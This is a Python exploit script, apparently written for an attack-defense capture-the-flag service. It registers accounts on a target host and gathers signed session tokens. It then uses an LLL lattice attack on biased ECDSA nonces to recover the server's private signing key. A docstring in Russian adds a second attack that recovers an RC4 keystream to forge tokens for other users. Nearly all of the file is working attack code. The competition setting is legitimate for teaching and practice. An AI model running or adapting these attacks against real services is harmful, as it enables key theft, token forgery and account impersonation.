#!/usr/bin/python3
from sage.all import Matrix, EllipticCurve, GF, QQ
from checklib import BaseChecker, get_initialized_session, rnd_string
from tokens.tokens import Tokens
from jeopardy_lib import CheckMachine
from Crypto.Util.number import *
import json
from hashlib import md5
import sys
import time

ip = sys.argv[1]
base_checker = BaseChecker(ip)
api = CheckMachine(base_checker)
session = get_initialized_session()
token_server = Tokens()
n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551



"""
Первая атака действительно очень простая и тупая(если не учитывать хардкоженые ключи). 
RC4 -- поточный шифр, то есть он выдает последовательность, на которую после поксорится сообщение.
Вы можете достать эту последовательность, просто зареговавшись и поксорив токен на своего юзера.
Потом вы сможете подписать любого другого юзера
Pobeda!!!
"""

class EcdsaAttacker:
    """
    ECDSA LLL attack. To protect you can patch curve, or change rng modulus to bigger. Or change md5 to other:D
    """
    def __init__(self):
        p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff
        a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc
        b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b
        E = EllipticCurve(GF(p), [a,b])
        G = (0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296,
                               0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5)
        self.G = E(G)
        self.E = E
        self.n = n

    def __compute_entrie(self, r, s, msg):
        first = (r * pow(s, -1, self.n)) % self.n 
        second = (msg * pow(s, -1, self.n)) % self.n

        return int(first), int(second)

    def __create_matrix_for_ecdsa(self, data, hashes):
        M = Matrix(QQ,len(data) + 2)
        B = 2 ** 128
        for i in range(len(data)):
            M[i,i] = self.n
        M[len(data),len(data)] = QQ(B)/QQ(self.n)
        M[len(data) + 1,len(data) + 1] = B

        for i in range(len(data)):
            M[len(data),i], M[len(data) + 1 ,i] = self.__compute_entrie(data[i][0], data[i][1], hashes[i])

        return M

    def __validate_private_key(self,r,s,e,key):
        Q = key * self.G
        w = pow(s,-1,n)
        u1 = int((e * w) % n)
        u2 = int((r * w) % n)
        X = u1 * self.G + u2 * Q
        v = int(X[0])
        return v == r

    def __generate_sign(self):
        m1 = rnd_string(10)
        c1 = api.register_ecdsa(session,m1,m1,m1)
        c1 = session.cookies['token']

        m1 = m1.encode().hex()
        m = dict()
        m['username'] = m1

        return json.dumps(m), c1

    def __generate_data(self, num = 2):
        m, c = [], []
        for _ in range(num):
            a,b = self.__generate_sign()
            m.append(a)
            c.append(b)
        return m,c

    def __attack_ecdsa(self):
        messages, cookies = self.__generate_data()
        ha = [bytes_to_long(md5(m.encode()).digest()) for m in messages]
        data = [list(
                    map(int, token_server.get_signed(m).split(b'.'))
                )
                    for m in cookies
                ]

        M = self.__create_matrix_for_ecdsa(data, ha)
        Q = (3429256294731552513081671032434071123964876036286682606626075266986296323058, 31964077332821133131515555774742945278841672086993984883557939193921737306325)
        Q = self.E(Q)
        for m in range(len(data)):
            r,s = data[m]
            h = ha[m]
            for row in M.LLL().rows():
                for k in row:
                    if int(k).bit_length() <= 128 and k > 0 and int(k) == k:
                        potential_d = int(pow(r,-1,self.n) )
                        potential_d *= int((k * s - h))
                        if self.__validate_private_key(r,s,h,potential_d):
                            print(f"d = {potential_d%n}")
                            return int(potential_d%n)


    def attack(self):
        return self.__attack_ecdsa()

if __name__ == "__main__":
    a = EcdsaAttacker()
    print(a.attack(), 1337)
